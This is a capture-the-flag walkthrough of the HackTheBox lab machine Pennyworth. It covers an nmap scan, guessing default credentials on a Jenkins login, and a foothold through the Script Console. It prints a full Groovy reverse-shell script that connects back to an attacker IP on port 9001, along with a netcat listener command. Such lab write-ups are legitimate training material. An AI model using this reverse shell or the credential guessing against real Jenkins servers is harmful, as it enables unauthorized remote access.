# **Description**

Hello l33ts, I hope you are doing well. Today we are going to look at [Pennyworth](https://app.hackthebox.com/starting-point?tier=1) from [HackTheBox](https://www.hackthebox.com).

# **Enumeration**
## nmap

We start a nmap scan using the following command: `sudo nmap -sC -sV -T4 {target_IP}`.

- -sC: run all the default scripts.

- -sV: Find the version of services running on the target.

- -T4: Aggressive scan to provide faster results.

```terminal
Nmap scan report for 10.129.193.169 (10.129.193.169)
Host is up (1.2s latency).
Not shown: 999 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
8080/tcp open  http    Jetty 9.4.39.v20210325
|_http-title: Site doesn't have a title (text/html;charset=utf-8).
| http-robots.txt: 1 disallowed entry 
|_/
|_http-server-header: Jetty(9.4.39.v20210325)
```

Found port 8080 open running jetty web server.

## Web

Let's navigate to port 8080.

Found a login page for Jenkins.

## ffuf

Let's run a directory scan.

Let's navigate to **/oops** page.

![](3.png)

This page reveals Jenkins version number. This version doesn't seem to be vulnerable to anything serious.

Let's try some default default credentials and attempt to login.

```
 - admin:admin
 - admin:password
 - admin:qwerty123
 - admin:root
 - root:root
 - root:admin
 - root:password
```

We managed to login using `root:password`.

# **Foothold**

Now that we managed to login as root, we can use script console to get a reverse shell.

At Jenkins Dashboard go to Manage Jenkins and then select Script Console.

At the script console, we can run any Groovy program code we want. So we will run the following script that would give us a reverse shell.

```groovy
String host="10.10.10.10";
int port=9001;
String cmd="/bin/bash";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
```

Next we need to setup a netcat listener to receive the shell.`nc -lvnp 9001`.

Now press run and you should get a shell.
